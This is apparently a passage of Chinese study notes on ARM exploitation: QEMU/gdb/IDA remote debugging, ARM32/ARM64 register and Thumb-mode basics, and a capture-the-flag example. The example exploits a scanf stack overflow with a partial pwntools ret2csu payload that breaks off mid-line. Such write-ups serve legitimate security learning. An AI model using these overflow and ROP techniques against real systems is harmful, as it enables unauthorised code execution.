<li><strong>为了调试 (Debugging):</strong> 正如上一个回答提到的，QEMU 的 -g 参数可以把它变成一个 GDB 服务器，让你能够使用 gdb-multiarch 这种强大的工具去单步调试、下断点、检查内存，这对于漏洞利用来说是必不可少的。</li>
</ol>
<p><strong>QEMU 为异构架构的程序（比如ARM）在本地计算机（x86）上创造了一个可以运行、可以调试的完整虚拟环境。</strong></p>
<p>配置好环境后我们知道arm架构的程序不能直接在本地计算机运行需要借助qemu这个虚拟环境来进行远程调试，下面将有gdb和ida的远程调试</p>
<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>先运行命令，将程序运行在1234端口</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">qemu-arm -L ./ -g 1234 ./pwn</span><br></pre></td></tr></table></figure>

<p>gdb命令：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br></pre></td></tr></table></figure>

<p>运行起来后先设置架构</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">arch</span> arm</span><br></pre></td></tr></table></figure>

<p>然后监听1234端口即可进行调试</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">target remote :1234</span><br></pre></td></tr></table></figure>



<p>最后的调试就和gdb命令一样啦</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"> //使用gdb编译 -g -o</span><br><span class="line">$ gdb -g program.c(源码) -o program(可执行文件)</span><br><span class="line">​</span><br><span class="line">//启动gdb调试</span><br><span class="line">$ gdb program(可执行文件名)</span><br><span class="line">​</span><br><span class="line">//运行</span><br><span class="line">(gdb)start   //程序运行，并停在第一行</span><br><span class="line">(gdb)r       //run，程序运行，遇到断点才停</span><br><span class="line">(gdb)c       //continue，继续运行</span><br><span class="line">(gdb)n 或者 s   //按照C语言行级别的单步调试，n(跟踪，不进入函数内部)，s(步入，进入函数内部)</span><br><span class="line">(gdb)ni 或者si  //按照汇编代码行级别的单步调试</span><br><span class="line">​</span><br><span class="line">//断点</span><br><span class="line">(gdb)b 函数名  //下断点 ，其他用法：b *地址；b 行号；b *函数名，断点设置在函数的开头</span><br><span class="line">(gdb)i b     //查看断点， info break</span><br><span class="line">(gdb)d 断点编号     //删除断点</span><br><span class="line">(gdb)clear 函数名/行号   //删除加在某个函数或某行的断点</span><br><span class="line">(gdb)commands 断点编号   //断点后添加代码，达到自动化调试</span><br><span class="line">     &gt; 代码</span><br><span class="line">     &gt; end</span><br><span class="line">(gdb)disable 断点编号   //设置断点无效</span><br><span class="line">(gdb)enable 断点编号    //设置断点生效</span><br><span class="line">(gdb)b 行号 if 条件    //设置条件断点 </span><br><span class="line">​</span><br><span class="line">//显示</span><br><span class="line">(gdb)disas 函数名   //disassemble，查看函数的汇编指令</span><br><span class="line">(gdb)info line   //查看当前位置的源代码在内存中地址，info 后面还可以加其它的，用于查看相关信息</span><br><span class="line">(gdb)x/从内存地址开始要显示内存单元的个数  内存地址   //显示内存</span><br><span class="line">​</span><br><span class="line">Ctrl+X+A   //进入或退出图形化调试窗口，或者在运行时使用gdb -tui 可执行文件名</span><br><span class="line">(gdb)layout regs  //实时显示寄存器值和源码的变化，layout后面还可以+ src(仅显示源代码窗口)/asm(仅显示汇编代码窗口)/split(显示源代码和汇编代码窗口)，layout next/prev(切换窗口)</span><br><span class="line">(gdb)win asm/src/split/regs +/- 行数  //调整窗口大小</span><br><span class="line">(gdb)tui reg float/system/general  //显示浮点寄存器/系统寄存器/通用寄存器</span><br><span class="line">​</span><br><span class="line">//查看当前代码</span><br><span class="line">(gdb)l    //list简写，从默认位置显示，显示当前行后面的源程序</span><br><span class="line">(gdb)l 行号   //从指定行显示</span><br><span class="line">(gdb)l 函数名   //从指定函数显示</span><br><span class="line">(gdb)show list  //显示list展示的行数</span><br><span class="line">(gdb)set list 行数  //设置list展示的行数</span><br><span class="line">​</span><br><span class="line">//打印，变量</span><br><span class="line">(gdb)p 变量名    //print，打印变量值</span><br><span class="line">(gdb)ptype 变量名  //打印变量类型</span><br><span class="line">(gdb)display 变量名   //跟踪查看一个变量，每次都停下来显示它的值</span><br><span class="line">(gdb)i display    //查看设置的自动变量操作</span><br><span class="line">(gdb)undisplay 自动变量编号   //取消对先前设置的那些变量的跟踪</span><br><span class="line">(gdb)set var 变量名 = 变量值  //设置变量</span><br><span class="line">(gdb)finish   //跳出函数体</span><br><span class="line">(gdb)until    //跳出循环</span><br></pre></td></tr></table></figure>

<h2 id="ida远程调试"><a href="#ida远程调试" class="headerlink" title="ida远程调试"></a>ida远程调试</h2><p>在linux系统中先运行起来<code>qemu-arm -L ./ -g 1234 ./pwn</code></p>
<p>设置debugger为Remote GDB debugger</p>
<img data-src="../images/image-20250714112054770.png" alt="image-20250714112054770" style="zoom: 50%;" />

<p>然后按照以下流程：debugger —-&gt; process options —-&gt; 填写 hostname和post —-&gt; OK —-&gt;debugger的attach to process</p>
<p>即可在ida中调试对应程序</p>
<p>ida调试基础：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">F9:运行（在调试器中启动一个新的进程或继续调试另一个进程）</span><br><span class="line">F2：设置断点</span><br><span class="line">Ctrl+F2：终止调试进程</span><br><span class="line">F4：执行到光标处</span><br><span class="line">F7:单步步入（进入函数内部）</span><br><span class="line">Ctrl+F7：执行到从当前函数返回时</span><br><span class="line">F8：单步跟踪（不进入函数内部）</span><br><span class="line">F5：查看伪代码</span><br><span class="line">Tab：伪代码和汇编指令之间的切换</span><br><span class="line">Ctrl+alt+S：打开堆栈记录窗口</span><br><span class="line">Ctrl+alt+B：打开断点窗口</span><br><span class="line">​</span><br><span class="line">Esc：在反汇编窗口中，返回到上一步操作的位置</span><br><span class="line">空格键：在反汇编窗口中，切换图形视图与列表视图</span><br><span class="line">​</span><br><span class="line">shift+F12:查看字符串</span><br><span class="line">Alt+T：搜索字符串</span><br><span class="line">Alt+B：搜索二进制序列</span><br><span class="line">Ctrl+B：搜索下一个字符串/二进制序列</span><br><span class="line">​</span><br><span class="line">Alt+M:给某个地址设置标签</span><br><span class="line">Ctrl+M：跳转到标签，通常配合Alt+M使用</span><br><span class="line">Ctrl+W：保存IDA数据库</span><br><span class="line">Ctrl+Shift+W：拍摄IDA快照</span><br><span class="line">​</span><br><span class="line">【；】：重复注释，会在所有引用到的地方都出现注释</span><br><span class="line">【：】：普通注释</span><br><span class="line">P：将数据转换为函数</span><br><span class="line">C: 将数据转化为代码，无法识别栈帧</span><br><span class="line">A：转换为字符串</span><br><span class="line">D：转换为数据</span><br><span class="line">U：转换为未定义数据</span><br><span class="line">X：查看交叉引用</span><br><span class="line">Y：修改类型</span><br><span class="line">N：修改名称</span><br><span class="line">G：转到指定地址</span><br><span class="line">H：十进制和十六进制转换</span><br></pre></td></tr></table></figure>

<p><strong>一些小技巧</strong></p>
<table>
<thead>
<tr>
<th align="left">架构</th>
<th align="left">关键识别词</th>
<th align="left">工具链包名 (Debian&#x2F;Ubuntu)</th>
<th align="left">反汇编命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>64位 ARM</strong></td>
<td align="left"><code>aarch64</code></td>
<td align="left"><code>binutils-aarch64-linux-gnu</code></td>
<td align="left"><code>aarch64-linux-gnu-objdump</code></td>
</tr>
<tr>
<td align="left"><strong>32位 ARM</strong></td>
<td align="left"><code>ARM</code>, <code>EABI5</code></td>
<td align="left"><code>binutils-arm-linux-gnueabihf</code></td>
<td align="left"><code>arm-linux-gnueabihf-objdump</code></td>
</tr>
</tbody></table>
<p>这两个工具包包含了对应的objdump与Linux中的objdump一样</p>
<p>常用命令：</p>
<ul>
<li><code>aarch64-linux-gnu-objdump -D ./test | less</code>  分页反汇编所有段 </li>
<li><code>objdump -f ./test </code> 显示文件头信息</li>
<li><code>readelf -h ./test</code>  显示文件头信息</li>
<li>_start即相当于_libc_start_main</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400490 &lt;_start&gt;:</span><br><span class="line">  400490:   mov     x29, #0x0         // 清空帧指针</span><br><span class="line">  400494:   mov     x30, #0x0         // 清空链接寄存器</span><br><span class="line">  400498:   ldr     x1, [sp]          // 从栈顶加载 argc 到 x0 (实际上是x1)</span><br><span class="line">  40049c:   add     x1, sp, #8        // 计算 argv 的地址给 x1</span><br><span class="line">  ...</span><br><span class="line">  4004b0:   bl      0x4006c0 &lt;main&gt;   // 调用 main 函数</span><br><span class="line">  4004b4:   mov     w0, w19           // main 返回后，将其返回值放入 w0</span><br><span class="line">  4004b8:   bl      0x4005e0 &lt;exit&gt;   // 调用 exit</span><br></pre></td></tr></table></figure>
<p><em>(注意：不同编译器和库版本，这里的实现细节会略有不同，但流程是一致的)</em></p>
<table>
<thead>
<tr>
<th align="left">概念</th>
<th align="left">含义</th>
<th align="left">如何找到&#x2F;定义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>入口点 (Entry Point)</strong></td>
<td align="left">OS 加载后执行的<strong>第一条指令</strong>的地址。</td>
<td align="left">• 用 <code>readelf -h</code> 查看<br>• 默认标签是 <code>_start</code></td>
</tr>
<tr>
<td align="left"><strong><code>main</code> 函数</strong></td>
<td align="left">C&#x2F;C++ 语言的<strong>逻辑起点</strong>，被 <code>_start</code> 调用。</td>
<td align="left">• 一个普通的函数，我们写的代码从这里开始。</td>
</tr>
</tbody></table>
<h1 id="arm基础知识"><a href="#arm基础知识" class="headerlink" title="arm基础知识"></a>arm基础知识</h1><p><a href="https://sky123.blog.csdn.net/article/details/128270882?spm=1001.2014.3001.5502">一篇不错的文章</a></p>
<h2 id="arm32"><a href="#arm32" class="headerlink" title="arm32"></a>arm32</h2><h3 id="碎知识"><a href="#碎知识" class="headerlink" title="碎知识"></a>碎知识</h3><p>来自《ARM汇编与逆向工程》的摘要</p>
<p>arm的传参方式为使用r0~r3寄存器传递前4个参数，多余的参数使用栈来传递</p>
<p>STMFD指令可以一次性将多个寄存器按逆序压入栈里</p>
<p>其中主要到STMFD结尾的D，可以理解为decrease，递减。那么同理STMFA指令就是按正序将寄存器压入栈里</p>
<p>与STMFD对应的LDMFD，作用类似于pop，可以按顺序将数据从栈里弹出到寄存器里。</p>
<p>arm里没有ret指令，程序是通过将栈里的地址弹到pc寄存器，从而实现函数返回。</p>
<p>arm使用r0作为函数的返回值寄存器</p>
<p>其中str指令，可以理解为STORE REGISTER，即将寄存器的值保存到内存中。与STR指令对应的LDR，即从内存数据加载到寄存器。</p>
<p>arm中的mov指令，只能是寄存器与寄存器之间或寄存器与立即数之间的操作，而不能对内存进行mov操作</p>
<p>arm中的B指令，时无条件跳转指令，类似于x86下的jmp</p>
<p>而BL指令是带返回的跳转，类似于x86下的call，会将返回地址压栈</p>
<p>表4.4 AArch32 通用寄存器别名</p>
<table>
<thead>
<tr>
<th>寄存器编号</th>
<th>别名</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>R11</td>
<td>FP</td>
<td>栈帧指针</td>
</tr>
<tr>
<td>R12</td>
<td>IP</td>
<td>子程序内部调用寄存器</td>
</tr>
<tr>
<td>R13</td>
<td>SP</td>
<td>栈指针</td>
</tr>
<tr>
<td>R14</td>
<td>LR</td>
<td>链接寄存器</td>
</tr>
<tr>
<td>R15</td>
<td>PC</td>
<td>程序计数器</td>
</tr>
</tbody></table>
<p>表5.1 移位操作语法符号</p>
<table>
<thead>
<tr>
<th>A32&#x2F;T32</th>
<th>A64 (32 位)</th>
<th>A64 (64 位)</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Rd</td>
<td>Wd</td>
<td>Xd</td>
<td>目标寄存器</td>
</tr>
<tr>
<td>Rn</td>
<td>Wn</td>
<td>Xn</td>
<td>第一源寄存器</td>
</tr>
<tr>
<td>Rm</td>
<td>Wm</td>
<td>Xm</td>
<td>第二源寄存器</td>
</tr>
<tr>
<td>Rs</td>
<td>Ws</td>
<td>Xs</td>
<td>保存移位量的源寄存器</td>
</tr>
<tr>
<td>#n</td>
<td>#n</td>
<td>#n</td>
<td>移位量（立即数）</td>
</tr>
<tr>
<td>{Rd,}</td>
<td>-</td>
<td>-</td>
<td>可选寄存器</td>
</tr>
</tbody></table>
<p>LDR和STR是一对相反的指令，LDR R1,[R0]将R0处的东西加载到R1,STR R1,[R0]将R1的东西加载到R0指向处</p>
<h3 id="Thumb模式"><a href="#Thumb模式" class="headerlink" title="Thumb模式"></a>Thumb模式</h3><p>ARM有两种主要的状态，ARM和Thumb模式，两种状态在所有的权限下都可以运行。</p>
<p><a href="https://blog.csdn.net/beyond702/article/details/50899196">参考链接</a></p>
<p>Thumb模式是16位模式，Thumb模式是16位模式，在该模式下，32位指令将为无效指令。Thumb指令为16位。Thumb模式的存在，使得代码更紧凑，有时单的语句，thumb指令2字节完成，而arm指令4字节完成，由此可以节省空间。</p>
<p>Arm与thumb模式的切换，主要是改变CPSR状态寄存器里的T标志位，如图，当T标志位为1时，cpu将处于thumb工作模式，反之，处于arm模式。<br><img data-src="../images/image-20250714201432283.png" alt="image-20250714201432283" style="zoom:67%;" /></p>
<p>即：</p>
<p><img data-src="/../images/f1078db8f11b422accaaee75a12afda8.png" alt="img"></p>
<p>改变CPSR状态寄存器里的T标志位，使用BX或者LDR PC等指令，都可以完成。假设addr是一个对齐后的地址（即addr末尾为4或者0），则BX addr+1就可以切换到thumb模式，而BX addr，就可以切换到arm模式。都是带状态转移的指令。</p>
<blockquote>
<p>反汇编分析时，识别thumb指令与arm指令</p>
<p>当看到code 16声明时，说明对面的代码都是thumb指令，只有再次遇到code32位时，后面的代码才是arm指令。</p>
<p>code32是arm指令;code16是thumb指令</p>
<p>code32的指令与code16处的指令互相调用就需要利用BX或者更改PC来跳转，跳转时地址最后1bit用于状态表示</p>
</blockquote>
<h2 id="arm64"><a href="#arm64" class="headerlink" title="arm64"></a>arm64</h2><p>arm64里，64位寄存器用X表示，比如X0、X1、X2，32位寄存器用W表示，比如W0、W1、W2。在ARM64下，没有了thumb指令。</p>
<p>ARM64的传参为X0~X7传递前8给参数，剩余的用栈传递。</p>
<p>返回值仍是X0寄存器</p>
<p>程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h,<span class="type">int</span> i,<span class="type">int</span> j,<span class="type">int</span> k,<span class="type">int</span> l)</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>,a,b,c,d);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        fun(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>arm的反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400658 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658 ; Attributes: bp-based frame fpd=0x30</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658                 EXPORT fun</span><br><span class="line">.text:0000000000400658 fun                                     ; CODE XREF: main+4C↓p</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658 var_30          = -0x30</span><br><span class="line">.text:0000000000400658 var_20          = -0x20</span><br><span class="line">.text:0000000000400658 var_1C          = -0x1C</span><br><span class="line">.text:0000000000400658 var_18          = -0x18</span><br><span class="line">.text:0000000000400658 var_14          = -0x14</span><br><span class="line">.text:0000000000400658 var_10          = -0x10</span><br><span class="line">.text:0000000000400658 var_C           = -0xC</span><br><span class="line">.text:0000000000400658 var_8           = -8</span><br><span class="line">.text:0000000000400658 var_4           = -4</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658                 STP             X29, X30, [SP,#var_30]! </span><br><span class="line">; 保存FP(X29)和LR(X30)到栈顶，同时SP -= 0x30</span><br><span class="line">.text:000000000040065C                 MOV             X29, SP; 设置新栈帧基址(X29 = SP)</span><br><span class="line">; 将寄存器参数存入栈帧（ARM64规则：前8个参数用W0-W7传递）</span><br><span class="line">.text:0000000000400660                 STR             W0, [X29,#0x30+var_4] ; 保存参数到栈 [X29-4]</span><br><span class="line">.text:0000000000400664                 STR             W1, [X29,#0x30+var_8]</span><br><span class="line">.text:0000000000400668                 STR             W2, [X29,#0x30+var_C]</span><br><span class="line">.text:000000000040066C                 STR             W3, [X29,#0x30+var_10]</span><br><span class="line">.text:0000000000400670                 STR             W4, [X29,#0x30+var_14]</span><br><span class="line">.text:0000000000400674                 STR             W5, [X29,#0x30+var_18]</span><br><span class="line">.text:0000000000400678                 STR             W6, [X29,#0x30+var_1C]</span><br><span class="line">.text:000000000040067C                 STR             W7, [X29,#0x30+var_20]</span><br><span class="line">.text:0000000000400680                 ADRL            X0, aDDDD ; &quot;%d %d %d %d\n&quot;</span><br><span class="line">; 加载格式字符串地址 &quot;%d %d %d %d\n&quot; 到 X0（参数1）</span><br><span class="line">.text:0000000000400688                 LDR             W4, [X29,#0x30+var_10]; 从栈加载第4个参数到 W4（参数5）</span><br><span class="line">.text:000000000040068C                 LDR             W3, [X29,#0x30+var_C]</span><br><span class="line">.text:0000000000400690                 LDR             W2, [X29,#0x30+var_8]</span><br><span class="line">.text:0000000000400694                 LDR             W1, [X29,#0x30+var_4]</span><br><span class="line">.text:0000000000400698                 BL              printf ; 调用 printf(X0, X1, X2, X3, W4)</span><br><span class="line">; === 函数退出 ===</span><br><span class="line">.text:000000000040069C                 MOV  W0, #1          ; 设置返回值 W0 = 1</span><br><span class="line">.text:00000000004006A0                 LDP  X29, X30, [SP+0x30+var_30],#0x30  ; 恢复FP/LR，同时 SP += 0x30</span><br><span class="line">.text:00000000004006A4                 RET                  ; 返回调用处（跳转到 LR 保存的地址）</span><br><span class="line">.text:00000000004006A4 ; End of function fun</span><br><span class="line">.text:00000000004006A4</span><br></pre></td></tr></table></figure>

<p>ARM64里ADRP寻址，使用ADRP将目标的页地址存入寄存器，然后使用add加上offest，从而获得目标地址</p>
<p>ARM64新增了ret指令，但是ret并不会从栈里弹出一个数据到pc中。ret指令会将Ir寄存器（X30）的值赋给pc。</p>
<p>因此，一般函数结尾可以看到这两句，其中X29类似于x86下的rbp。X30是LR寄存器，ret就是将x30的值赋给pc，从而实现返回</p>
<p><img data-src="/../images/image-20250714210630341.png" alt="image-20250714210630341"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>在x86下的各种思想，同样使用于arm。</p>
<p>通过csu控制多个寄存器，并调用对应的函数</p>
<p>arm下的堆的性质取决于libc，如果是glibc那么以前的手法都是用，如果是其它libc，也可以自行调试，发现性质。</p>
<table>
<thead>
<tr>
<th>架构</th>
<th>等价于 ebp&#x2F;rbp 的寄存器</th>
<th>官方名称&#x2F;常用别名</th>
</tr>
</thead>
<tbody><tr>
<td><strong>arm32 (A32&#x2F;T32)</strong></td>
<td>R11</td>
<td>fp (Frame Pointer)</td>
</tr>
<tr>
<td><strong>aarch64 (A64)</strong></td>
<td>X29</td>
<td>fp (Frame Pointer)</td>
</tr>
</tbody></table>
<h2 id="例题学习"><a href="#例题学习" class="headerlink" title="例题学习"></a>例题学习</h2><h3 id="root-me-stack-buffer-overflow-basic"><a href="#root-me-stack-buffer-overflow-basic" class="headerlink" title="root_me_stack_buffer_overflow_basic"></a>root_me_stack_buffer_overflow_basic</h3><p>自己整的题，保护：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Arch:       arm-32-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled on new kernels</span><br><span class="line">PIE:        No PIE (0x10000)</span><br><span class="line">Stack:      Executable</span><br><span class="line">RWX:        Has RWX segments</span><br><span class="line">FORTIFY:    Enabled</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>

<p>可以注入shellcode到bss段，在跳转过去执行</p>
<p>反汇编如下，很明显的可以看到scanf没有进行输入限制，存在溢出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s_1; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// t1</span></span><br><span class="line">  <span class="type">int</span> n15; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">char</span> n121; <span class="comment">// [sp+7h] [bp-A9h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">168</span>]; <span class="comment">// [sp+8h] [bp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  n121 = <span class="number">121</span>;<span class="comment">//&#x27;y&#x27;</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    _printf_chk(<span class="number">1</span>, <span class="string">&quot;Give me data to dump:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot; %[^\n]s&quot;</span>, s) )  <span class="comment">//scanf()溢出</span></span><br><span class="line">    &#123;</span><br><span class="line">      s_1 = s;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">strlen</span>(s) &gt; v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          n15 = v4++ &amp; <span class="number">0xF</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !n15 )</span><br><span class="line">            _printf_chk(<span class="number">1</span>, <span class="string">&quot;%p: &quot;</span>, s_1);</span><br><span class="line">          v5 = (<span class="type">unsigned</span> __int8)*s_1++;</span><br><span class="line">          _printf_chk(<span class="number">1</span>, <span class="string">&quot; %02x&quot;</span>, v5);</span><br><span class="line">          <span class="keyword">if</span> ( n15 != <span class="number">15</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          _printf_chk(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) &lt;= v4 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_9:</span><br><span class="line">    _printf_chk(<span class="number">1</span>, <span class="string">&quot;\nDump again (y/n):\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;n121) &amp;&amp; (n121 &amp; <span class="number">0xDF</span>) == <span class="number">0x59</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题的思路是我们通过csu来控制流程，执行函数，如图：</p>
<img data-src="../images/image-20250715164602158.png" alt="image-20250715164602158" style="zoom:67%;" />

<table>
<thead>
<tr>
<th>特性</th>
<th>call (Intel x86)</th>
<th>BL (ARM 32-bit)</th>
<th>BLX (ARM 32-bit)</th>
</tr>
</thead>
<tbody><tr>
<td><strong>主要功能</strong></td>
<td>子程序调用</td>
<td>子程序调用</td>
<td>子程序调用并切换状态</td>
</tr>
<tr>
<td><strong>返回地址存储</strong></td>
<td>压入<strong>栈</strong></td>
<td>存入<strong>链接寄存器 (LR)</strong></td>
<td>存入<strong>链接寄存器 (LR)</strong></td>
</tr>
<tr>
<td><strong>指令集切换</strong></td>
<td>不适用</td>
<td><strong>否</strong> (保持当前状态)</td>
<td><strong>是</strong> (根据目标地址的最低位决定)</td>
</tr>
<tr>
<td><strong>典型用途</strong></td>
<td>所有函数调用</td>
<td>调用同一指令集的函数</td>
<td>在 ARM 和 Thumb 代码间互相调用</td>
</tr>
</tbody></table>
<p>但是呢在csu处的前面我们可以发现它是CODE16说明csu处的指令是thumb模式，如下图可说明：</p>
<img data-src="../images/image-20250715164716861.png" alt="image-20250715164716861" style="zoom:67%;" />

<p>因为csu处是thumb指令所有我们肯定不能直接控制pc到0x10610处调用，而是0x10611后面的那个1并不是地址里面的而是一个标志位（改变CPSR状态寄存器里的T标志位），就是前面那张图片中State bit(工作状态)设置为1</p>
<p>总体思路：</p>
<p>最终exp，就是一个ret2csu</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./root_me_stack_buffer_overflow_basic_20210901_115841&#x27;</span>)</span><br><span class="line">scanf_got = elf.got[<span class="string">&#x27;scanf&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x00021008</span> + <span class="number">0x100</span></span><br><span class="line">csu_pop = <span class="number">0x00010610</span></span><br><span class="line">csu_call = <span class="number">0x000105FE</span></span><br><span class="line">sh = process(argv=[<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf&#x27;</span>,<span class="string">&#x27;./root_me_stack_buffer_overflow_basic_20210901_115841&#x27;</span>])</span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;./root_me_stack_buffer_overflow_basic_20210901_115841&#x27;])</span></span><br><span class="line"><span class="comment"># 目标：调用 scanf(format, bss_addr)，其中 format 是我们输入的 shellcode</span></span><br><span class="line"><span class="comment"># scanf 的原型是 scanf(const char *format, ...);</span></span><br><span class="line"><span class="comment"># R0 = format_string_address</span></span><br><span class="line"><span class="comment"># R1 = address_to_write_to</span></span><br><span class="line"><span class="comment"># ... 其他参数================&gt;&gt;&gt; R3(R0,R1...)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们需要控制的寄存器：</span></span><br><span class="line"><span class="comment"># R0 -&gt; &quot;我们发送的shellcode&quot; (这比较难直接控制，但 scanf 可以从标准输入读取)</span></span><br><span class="line"><span class="comment"># R1 -&gt; bss (一个可写的内存地址，用来存放 shellcode)</span></span><br><span class="line"><span class="comment"># R7 -&gt; R0 -&gt; 调用 scanf 时，R7 需要是 scanf 的第一个参数。这里利用 R7 来控制 R0。</span></span><br><span class="line"><span class="comment">#       但是 scanf 的第一个参数是格式化字符串，我们希望它能接收任意字符，</span></span><br><span class="line"><span class="comment">#       可以找一个指向类似 &quot;%s&quot; 或能接收输入的地址，或者更巧妙地，利用 scanf 自身特性。</span></span><br><span class="line"><span class="comment">#       这里 exp 的作者选择了一个更简单直接的方式：利用 scanf 的返回值，</span></span><br><span class="line"><span class="comment">#       并构造一个 ROP 链来调用它。</span></span><br><span class="line"><span class="comment">#       不过这里的payload的目的是调用 scanf(0x00010644, bss)。</span></span><br><span class="line"><span class="comment">#       查看 0x00010644 的内容可能是一个格式化字符串。</span></span><br><span class="line"><span class="comment"># R8 -&gt; R1 -&gt; bss (用来存放 shellcode 的地址)</span></span><br><span class="line"><span class="comment"># R9 -&gt; R2 -&gt; 这里用不到第三个参数，设为 0</span></span><br><span class="line"><span class="comment"># R5 -&gt; scanf_got (scanf 函数在 GOT 表中的地址，LDR.W R3, [R5] 会把 scanf 的真实地址加载到 R3)</span></span><br><span class="line"><span class="comment"># R6 -&gt; 1 (用于跳出循环)</span></span><br><span class="line"><span class="comment"># R4 -&gt; 0 (初始值，在 csu_call 中加 1 后会等于 R6，从而跳出循环)</span></span><br><span class="line"><span class="comment"># R3 -&gt; 我们要调用的函数</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xA4</span> + p32(csu_pop + <span class="number">1</span>) <span class="comment">#切换到Thumb模式，bit0 = 1</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#R3</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#R4</span></span><br><span class="line">payload += p32(scanf_got) <span class="comment">#R5</span></span><br><span class="line">payload += p32(<span class="number">1</span>) <span class="comment">#R6</span></span><br><span class="line">payload += p32(<span class="number">0x00010644</span>) <span class="comment">#R7</span></span><br><span class="line">payload += p32(bss) <span class="comment">#R8</span></span><br><span class="line">payload += 